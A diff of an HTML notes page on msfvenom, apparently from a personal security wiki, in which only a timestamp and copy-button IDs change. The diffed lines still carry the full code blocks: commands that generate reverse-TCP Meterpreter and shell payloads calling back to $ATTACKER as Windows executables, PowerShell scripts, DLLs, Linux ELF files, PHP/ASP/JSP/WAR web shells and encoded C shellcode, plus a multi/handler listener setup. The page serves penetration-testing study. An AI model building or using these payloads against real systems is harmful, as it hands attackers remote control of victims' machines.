@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:15 -->
+<!-- 2026-07-30 Thu 22:25 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Msfvenom</title>
@@ -990,11 +990,11 @@ Related: <a href="20260213T110116--metasploit__cybersecurity_tool.html">Metasplo
 <h2 id="org6955744">Common Payloads</h2>
 <div class="outline-text-2" id="text-org6955744">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8dc7ffc8ce944aa78c81edfd311b9c5d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_acc8444280f64cf6ad38f4ff8d376ba0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8dc7ffc8ce944aa78c81edfd311b9c5d=document.querySelector('button[name=btn_8dc7ffc8ce944aa78c81edfd311b9c5d]');
-copyBtnbtn_8dc7ffc8ce944aa78c81edfd311b9c5d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# List payloads for a platform\nmsfvenom --list payloads | grep windows/x64\nmsfvenom --list payloads | grep linux/x64\n`);copyBtnbtn_8dc7ffc8ce944aa78c81edfd311b9c5d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8dc7ffc8ce944aa78c81edfd311b9c5d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_acc8444280f64cf6ad38f4ff8d376ba0=document.querySelector('button[name=btn_acc8444280f64cf6ad38f4ff8d376ba0]');
+copyBtnbtn_acc8444280f64cf6ad38f4ff8d376ba0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# List payloads for a platform\nmsfvenom --list payloads | grep windows/x64\nmsfvenom --list payloads | grep linux/x64\n`);copyBtnbtn_acc8444280f64cf6ad38f4ff8d376ba0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_acc8444280f64cf6ad38f4ff8d376ba0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1008,11 +1008,11 @@ msfvenom --list payloads | grep linux/x64
 <h3 id="orgd4d9ccb">Windows</h3>
 <div class="outline-text-3" id="text-orgd4d9ccb">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_177f19f6522a4fc3b6d47ae2955bff8d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2f1c3e01c73f4f3a9cedf9d5b70ac9b6>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_177f19f6522a4fc3b6d47ae2955bff8d=document.querySelector('button[name=btn_177f19f6522a4fc3b6d47ae2955bff8d]');
-copyBtnbtn_177f19f6522a4fc3b6d47ae2955bff8d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Staged Meterpreter reverse TCP (most common)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Stageless (single) — more reliable on unstable connections\nmsfvenom -p windows/x64/meterpreter_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Simple reverse shell (no Meterpreter)\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# PowerShell (fileless delivery)\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f ps1 -o shell.ps1\n\n# DLL\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f dll -o shell.dll\n`);copyBtnbtn_177f19f6522a4fc3b6d47ae2955bff8d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_177f19f6522a4fc3b6d47ae2955bff8d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2f1c3e01c73f4f3a9cedf9d5b70ac9b6=document.querySelector('button[name=btn_2f1c3e01c73f4f3a9cedf9d5b70ac9b6]');
+copyBtnbtn_2f1c3e01c73f4f3a9cedf9d5b70ac9b6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Staged Meterpreter reverse TCP (most common)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Stageless (single) — more reliable on unstable connections\nmsfvenom -p windows/x64/meterpreter_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Simple reverse shell (no Meterpreter)\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# PowerShell (fileless delivery)\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f ps1 -o shell.ps1\n\n# DLL\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f dll -o shell.dll\n`);copyBtnbtn_2f1c3e01c73f4f3a9cedf9d5b70ac9b6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2f1c3e01c73f4f3a9cedf9d5b70ac9b6.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1043,11 +1043,11 @@ let res = copyTextToClipboard(`# Staged Meterpreter reverse TCP (most common)\nm
 <h3 id="org243cdaa">Linux</h3>
 <div class="outline-text-3" id="text-org243cdaa">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ccd0e0936dec4f68b5c36bc1afec8b48>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_92faf9d3645d46f3bb56aa9b3979c946>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ccd0e0936dec4f68b5c36bc1afec8b48=document.querySelector('button[name=btn_ccd0e0936dec4f68b5c36bc1afec8b48]');
-copyBtnbtn_ccd0e0936dec4f68b5c36bc1afec8b48.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# ELF executable\nmsfvenom -p linux/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n\nchmod +x shell.elf\n\n# Stageless\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n`);copyBtnbtn_ccd0e0936dec4f68b5c36bc1afec8b48.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ccd0e0936dec4f68b5c36bc1afec8b48.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_92faf9d3645d46f3bb56aa9b3979c946=document.querySelector('button[name=btn_92faf9d3645d46f3bb56aa9b3979c946]');
+copyBtnbtn_92faf9d3645d46f3bb56aa9b3979c946.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# ELF executable\nmsfvenom -p linux/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n\nchmod +x shell.elf\n\n# Stageless\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n`);copyBtnbtn_92faf9d3645d46f3bb56aa9b3979c946.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_92faf9d3645d46f3bb56aa9b3979c946.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1068,11 +1068,11 @@ chmod +x shell.elf
 <h3 id="orgfe247ab">Web Shells</h3>
 <div class="outline-text-3" id="text-orgfe247ab">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e7a128d72b9f47af855046c13167a44f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ac724af22c7c442cabdd2117069634f0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e7a128d72b9f47af855046c13167a44f=document.querySelector('button[name=btn_e7a128d72b9f47af855046c13167a44f]');
-copyBtnbtn_e7a128d72b9f47af855046c13167a44f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# PHP\nmsfvenom -p php/meterpreter_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f raw -o shell.php\n\n# ASP (IIS)\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f asp -o shell.asp\n\n# ASPX (IIS)\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f aspx -o shell.aspx\n\n# WAR (Tomcat)\nmsfvenom -p java/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f war -o shell.war\n\n# JSP\nmsfvenom -p java/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f jsp -o shell.jsp\n`);copyBtnbtn_e7a128d72b9f47af855046c13167a44f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e7a128d72b9f47af855046c13167a44f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ac724af22c7c442cabdd2117069634f0=document.querySelector('button[name=btn_ac724af22c7c442cabdd2117069634f0]');
+copyBtnbtn_ac724af22c7c442cabdd2117069634f0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# PHP\nmsfvenom -p php/meterpreter_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f raw -o shell.php\n\n# ASP (IIS)\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f asp -o shell.asp\n\n# ASPX (IIS)\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f aspx -o shell.aspx\n\n# WAR (Tomcat)\nmsfvenom -p java/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f war -o shell.war\n\n# JSP\nmsfvenom -p java/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f jsp -o shell.jsp\n`);copyBtnbtn_ac724af22c7c442cabdd2117069634f0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ac724af22c7c442cabdd2117069634f0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1103,11 +1103,11 @@ let res = copyTextToClipboard(`# PHP\nmsfvenom -p php/meterpreter_reverse_tcp \\
 <h3 id="orgc0a9c65">Shellcode for Buffer Overflow</h3>
 <div class="outline-text-3" id="text-orgc0a9c65">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_eaded00cca4f4d5d9fb222e608e29c18>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_af1998d5afc148a385dda029208d6256>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_eaded00cca4f4d5d9fb222e608e29c18=document.querySelector('button[name=btn_eaded00cca4f4d5d9fb222e608e29c18]');
-copyBtnbtn_eaded00cca4f4d5d9fb222e608e29c18.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Raw shellcode — C format for embedding in exploit\nmsfvenom -p linux/x86/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -b \"\\x00\" -f c\n\n# With encoder to avoid bad chars\nmsfvenom -p windows/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 \\\n  -b \"\\x00\\x0a\\x0d\" \\\n  -e x86/shikata_ga_nai -i 3 \\\n  -f c\n`);copyBtnbtn_eaded00cca4f4d5d9fb222e608e29c18.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_eaded00cca4f4d5d9fb222e608e29c18.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_af1998d5afc148a385dda029208d6256=document.querySelector('button[name=btn_af1998d5afc148a385dda029208d6256]');
+copyBtnbtn_af1998d5afc148a385dda029208d6256.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Raw shellcode — C format for embedding in exploit\nmsfvenom -p linux/x86/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -b \"\\x00\" -f c\n\n# With encoder to avoid bad chars\nmsfvenom -p windows/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 \\\n  -b \"\\x00\\x0a\\x0d\" \\\n  -e x86/shikata_ga_nai -i 3 \\\n  -f c\n`);copyBtnbtn_af1998d5afc148a385dda029208d6256.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_af1998d5afc148a385dda029208d6256.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1134,11 +1134,11 @@ Always start the listener before delivering the payload:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_6e11d80c84d94e0bb5fae1740fc31305>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_4b983a0ed9ab4fe0a7f15ca527132fff>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6e11d80c84d94e0bb5fae1740fc31305=document.querySelector('button[name=btn_6e11d80c84d94e0bb5fae1740fc31305]');
-copyBtnbtn_6e11d80c84d94e0bb5fae1740fc31305.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# In msfconsole\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST $ATTACKER\nset LPORT 4444\nrun -j   # run as background job\n`);copyBtnbtn_6e11d80c84d94e0bb5fae1740fc31305.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6e11d80c84d94e0bb5fae1740fc31305.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4b983a0ed9ab4fe0a7f15ca527132fff=document.querySelector('button[name=btn_4b983a0ed9ab4fe0a7f15ca527132fff]');
+copyBtnbtn_4b983a0ed9ab4fe0a7f15ca527132fff.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# In msfconsole\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST $ATTACKER\nset LPORT 4444\nrun -j   # run as background job\n`);copyBtnbtn_4b983a0ed9ab4fe0a7f15ca527132fff.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4b983a0ed9ab4fe0a7f15ca527132fff.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1161,11 +1161,11 @@ in msfvenom exactly.
 <h2 id="orgce9faa7">Staged vs Stageless</h2>
 <div class="outline-text-2" id="text-orgce9faa7">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_893fe9c5c0874b18ba4dfe5954b723f5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_3a3f365657694e1980eba2ef855aad27>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_893fe9c5c0874b18ba4dfe5954b723f5=document.querySelector('button[name=btn_893fe9c5c0874b18ba4dfe5954b723f5]');
-copyBtnbtn_893fe9c5c0874b18ba4dfe5954b723f5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`Staged:     windows/x64/meterpreter/reverse_tcp\n             — small initial stager fetches the main payload from listener\n             — smaller file size, requires reliable connection to listener\n\nStageless:  windows/x64/meterpreter_reverse_tcp  (note: no slash before reverse)\n             — self-contained, entire payload in the file\n             — larger but works without follow-up connection to listener\n`);copyBtnbtn_893fe9c5c0874b18ba4dfe5954b723f5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_893fe9c5c0874b18ba4dfe5954b723f5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3a3f365657694e1980eba2ef855aad27=document.querySelector('button[name=btn_3a3f365657694e1980eba2ef855aad27]');
+copyBtnbtn_3a3f365657694e1980eba2ef855aad27.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`Staged:     windows/x64/meterpreter/reverse_tcp\n             — small initial stager fetches the main payload from listener\n             — smaller file size, requires reliable connection to listener\n\nStageless:  windows/x64/meterpreter_reverse_tcp  (note: no slash before reverse)\n             — self-contained, entire payload in the file\n             — larger but works without follow-up connection to listener\n`);copyBtnbtn_3a3f365657694e1980eba2ef855aad27.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3a3f365657694e1980eba2ef855aad27.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
